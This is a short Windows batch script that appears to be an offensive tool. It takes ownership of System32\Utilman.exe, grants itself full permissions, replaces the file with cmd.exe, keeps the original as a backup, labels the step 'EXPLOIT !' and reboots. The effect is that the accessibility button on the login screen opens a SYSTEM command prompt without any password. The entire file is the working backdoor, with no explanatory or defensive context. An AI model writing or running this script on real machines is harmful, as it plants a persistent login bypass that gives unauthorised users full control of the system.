@echo off
color A

takeown /f "C:\WINDOWS\System32\Utilman.exe"
echo [*] GET ALL PERMISSIONS...
icacls "C:\WINDOWS\System32\Utilman.exe" /grant Administrateurs:f

echo [*] REPLACE UTILMAN.EXE BY CMD.EXE...
xcopy "C:\WINDOWS\System32\cmd.exe"  "C:\WINDOWS"

echo [*] RENAME UTILMAN.EXE.BACK...
ren "C:\WINDOWS\System32\Utilman.exe" Utilman.exe.back
ren "C:\WINDOWS\cmd.exe" Utilman.exe
move "C:\WINDOWS\Utilman.exe" "C:\WINDOWS\System32"

echo [*] EXPLOIT !
echo [*] REBOOT THE SYSTEM...
shutdown /r -t 1